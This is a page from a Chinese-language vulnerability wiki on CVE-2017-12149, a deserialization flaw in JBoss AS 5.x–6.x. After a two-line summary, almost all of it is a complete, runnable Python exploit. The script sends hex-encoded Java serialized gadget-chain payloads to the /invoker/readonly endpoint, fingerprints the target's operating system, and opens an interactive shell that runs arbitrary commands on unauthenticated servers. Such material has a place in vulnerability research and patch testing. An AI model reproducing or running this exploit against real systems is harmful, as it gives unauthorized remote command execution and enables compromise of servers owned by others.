<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-12149%EF%BC%89JBosS%20AS%206.X%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2017-12149\uff09JBosS AS 6.X \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2017-7504%EF%BC%89JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2017-7504%EF%BC%89JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2015-7501%EF%BC%89JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2015-7501%EF%BC%89JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2017-12149jboss-as-6x">（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞<a class="headerlink" href="#cve-2017-12149jboss-as-6x" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>JBOSSApplication
Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>JBoss 5.x - 6.x</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">cve</span><span class="o">-</span><span class="mi">2017</span><span class="o">-</span><span class="mi">12149</span><span class="n">_cmd</span><span class="o">.</span><span class="n">py</span>
<span class="c1">#!/usr/bin/python</span>
<span class="c1">#-*- coding:utf-8 -*-</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">binascii</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+---------------------------------------------------------------+&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+ DES: by zhzyker as https://github.com/zhzyker/exphub          +&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+      as https://github.com/1337g/CVE-2017-10271               +&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+---------------------------------------------------------------+&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+ USE: python &lt;filename&gt; &lt;url&gt;                                  +&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+ EXP: python cve-2017-12149_cmd.py http://freeerror.org:8080   +&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+ VER: Jboss AS 5.X                                             +&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+      Jboss AS 6.X                                             +&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+---------------------------------------------------------------+&#39;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
<span class="n">url_in</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">linux_payload_1</span> <span class="o">=</span>  <span class="s2">&quot;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000&quot;</span>                  <span class="s2">&quot;7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f&quot;</span>                  <span class="s2">&quot;6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279&quot;</span>                  <span class="s2">&quot;8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563&quot;</span>                  <span class="s2">&quot;743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372&quot;</span>                  <span class="s2">&quot;002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170&quot;</span>                  <span class="s2">&quot;2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267&quot;</span>                  <span class="s2">&quot;2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72&quot;</span>                  <span class="s2">&quot;6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374&quot;</span>                  <span class="s2">&quot;696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec&quot;</span>                  <span class="s2">&quot;287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163&quot;</span>                  <span class="s2">&quot;68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78&quot;</span>                  <span class="s2">&quot;707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e&quot;</span>                  <span class="s2">&quot;732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f&quot;</span>                  <span class="s2">&quot;72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f&quot;</span>                  <span class="s2">&quot;72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009&quot;</span>                  <span class="s2">&quot;69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173&quot;</span>                  <span class="s2">&quot;734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63&quot;</span>                  <span class="s2">&quot;6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254&quot;</span>                  <span class="s2">&quot;72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61&quot;</span>                  <span class="s2">&quot;76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176&quot;</span>                  <span class="s2">&quot;612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176&quot;</span>                  <span class="s2">&quot;612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563&quot;</span>                  <span class="s2">&quot;743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43&quot;</span>                  <span class="s2">&quot;6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574&quot;</span>                  <span class="s2">&quot;2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275&quot;</span>                  <span class="s2">&quot;71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00&quot;</span>                  <span class="s2">&quot;18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a&quot;</span>                  <span class="s2">&quot;fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479&quot;</span>                  <span class="s2">&quot;71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74&quot;</span>                  <span class="s2">&quot;6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f74&quot;</span>                  <span class="s2">&quot;6d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a00&quot;</span>                  <span class="s2">&quot;0000017671007e00187371007e00137571007e00180000000174000e52756e436865636b&quot;</span>                  <span class="s2">&quot;436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a617661&quot;</span>                  <span class="s2">&quot;2e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00&quot;</span>                  <span class="s2">&quot;18000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171&quot;</span>                  <span class="s2">&quot;007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e&quot;</span>                  <span class="s2">&quot;537472696e673badd256e7e91d7b470200007870000000017400&quot;</span>
<span class="n">win_payload_1</span> <span class="o">=</span>  <span class="s2">&quot;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000&quot;</span>                  <span class="s2">&quot;7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f&quot;</span>                  <span class="s2">&quot;6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279&quot;</span>                  <span class="s2">&quot;8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563&quot;</span>                  <span class="s2">&quot;743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372&quot;</span>                  <span class="s2">&quot;002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170&quot;</span>                  <span class="s2">&quot;2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267&quot;</span>                  <span class="s2">&quot;2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72&quot;</span>                  <span class="s2">&quot;6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374&quot;</span>                  <span class="s2">&quot;696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec&quot;</span>                  <span class="s2">&quot;287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163&quot;</span>                  <span class="s2">&quot;68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78&quot;</span>                  <span class="s2">&quot;707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e&quot;</span>                  <span class="s2">&quot;732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f&quot;</span>                  <span class="s2">&quot;72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f&quot;</span>                  <span class="s2">&quot;72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009&quot;</span>                  <span class="s2">&quot;69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173&quot;</span>                  <span class="s2">&quot;734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63&quot;</span>                  <span class="s2">&quot;6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254&quot;</span>                  <span class="s2">&quot;72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61&quot;</span>                  <span class="s2">&quot;76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176&quot;</span>                  <span class="s2">&quot;612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176&quot;</span>                  <span class="s2">&quot;612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563&quot;</span>                  <span class="s2">&quot;743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43&quot;</span>                  <span class="s2">&quot;6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574&quot;</span>                  <span class="s2">&quot;2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275&quot;</span>                  <span class="s2">&quot;71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00&quot;</span>                  <span class="s2">&quot;18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a&quot;</span>                  <span class="s2">&quot;fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479&quot;</span>                  <span class="s2">&quot;71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74&quot;</span>                  <span class="s2">&quot;6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f63&quot;</span>                  <span class="s2">&quot;3a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e73&quot;</span>                  <span class="s2">&quot;74616e63657571007e001a000000017671007e00187371007e00137571007e0018000000&quot;</span>                  <span class="s2">&quot;0174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a&quot;</span>                  <span class="s2">&quot;00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078&quot;</span>                  <span class="s2">&quot;707371007e00137571007e0018000000017571007e001a0000000171007e003371007e00&quot;</span>                  <span class="s2">&quot;1e7571007e001a0000000171007e00207371007e00137571007e00180000000175720013&quot;</span>                  <span class="s2">&quot;5b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001&quot;</span>                  <span class="s2">&quot;7400&quot;</span>
<span class="n">payload_2</span> <span class="o">=</span>  <span class="s2">&quot;71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e48617&quot;</span>                  <span class="s2">&quot;3684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573&quot;</span>                  <span class="s2">&quot;686f6c6478703f4000000000000077080000001000000000787878&quot;</span>

<span class="n">payload_other</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

<span class="n">os_type</span> <span class="o">=</span> <span class="s2">&quot;unknown&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">build_command_hex</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">command_exec_hex</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{:02x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">command</span><span class="p">)</span>
    <span class="n">command_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
    <span class="n">command_len_hex</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{:02x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">command_len</span><span class="p">)</span>
    <span class="n">command_hex</span> <span class="o">=</span> <span class="n">command_len_hex</span> <span class="o">+</span> <span class="n">command_exec_hex</span>
    <span class="k">return</span> <span class="n">command_hex</span>

<span class="k">def</span><span class="w"> </span><span class="nf">build_payload</span><span class="p">(</span><span class="n">target_os</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">os_type</span>
    <span class="k">if</span> <span class="n">os_type</span> <span class="o">==</span> <span class="s2">&quot;unknown&quot;</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">target_os</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">linux_payload_1</span> <span class="o">+</span> <span class="n">build_command_hex</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload_2</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">target_os</span> <span class="o">==</span> <span class="s2">&quot;windows&quot;</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">win_payload_1</span> <span class="o">+</span> <span class="n">build_command_hex</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload_2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">os_type</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">linux_payload_1</span> <span class="o">+</span> <span class="n">build_command_hex</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload_2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">os_type</span> <span class="o">==</span> <span class="s2">&quot;windows&quot;</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">win_payload_1</span> <span class="o">+</span> <span class="n">build_command_hex</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload_2</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span><span class="w"> </span><span class="nf">do_post</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">payload_url</span> <span class="o">=</span> <span class="n">url_in</span> <span class="o">+</span> <span class="s2">&quot;/invoker/readonly&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">payload_url</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">result_content</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result_content</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_OS</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">os_type</span>
    <span class="n">payload_linux</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
    <span class="n">payload_win</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="s1">&#39;windows&#39;</span><span class="p">,</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
    <span class="n">linux_re</span> <span class="o">=</span> <span class="n">do_post</span><span class="p">(</span><span class="n">payload_linux</span><span class="p">)</span>
    <span class="n">win_re</span> <span class="o">=</span> <span class="n">do_post</span><span class="p">(</span><span class="n">payload_win</span><span class="p">)</span>
    <span class="k">if</span>  <span class="s2">&quot;[L291919]&quot;</span> <span class="ow">in</span> <span class="n">linux_re</span><span class="p">:</span>
        <span class="n">os_type</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
    <span class="k">if</span> <span class="s2">&quot;[W291013]&quot;</span> <span class="ow">in</span> <span class="n">win_re</span><span class="p">:</span>
        <span class="n">os_type</span> <span class="o">=</span> <span class="s1">&#39;windows&#39;</span>
    <span class="k">return</span> <span class="n">os_type</span>


<span class="k">def</span><span class="w"> </span><span class="nf">run_command</span><span class="p">(</span><span class="n">command_in</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">os_type</span><span class="p">,</span><span class="n">command_in</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">do_post</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span> <span class="p">(</span> <span class="s1">&#39;](.*?)RunCheckConfig&#39;</span><span class="p">,</span><span class="n">result</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;command error!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">command_callback</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">command_callback</span>

<span class="n">check_OS</span><span class="p">()</span>
<span class="k">if</span> <span class="n">os_type</span> <span class="o">==</span><span class="s2">&quot;unknown&quot;</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Unknown System&quot;</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="nb">print</span> <span class="s2">&quot;***************************************************** </span><span class="se">\n</span><span class="s2">&quot;</span>            <span class="s2">&quot;*             Target system is  &quot;</span> <span class="o">+</span> <span class="n">os_type</span> <span class="o">+</span> <span class="s2">&quot; OS            * </span><span class="se">\n</span><span class="s2">&quot;</span>            <span class="s2">&quot;***************************************************** </span><span class="se">\n</span><span class="s2">&quot;</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">command_in</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;Shell &gt;&gt;&gt; &quot;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">command_in</span> <span class="o">==</span> <span class="s2">&quot;exit&quot;</span> <span class="p">:</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">run_command</span><span class="p">(</span><span class="n">command_in</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2017-7504%EF%BC%89JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2017-7504%EF%BC%89JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2015-7501%EF%BC%89JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2015-7501%EF%BC%89JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>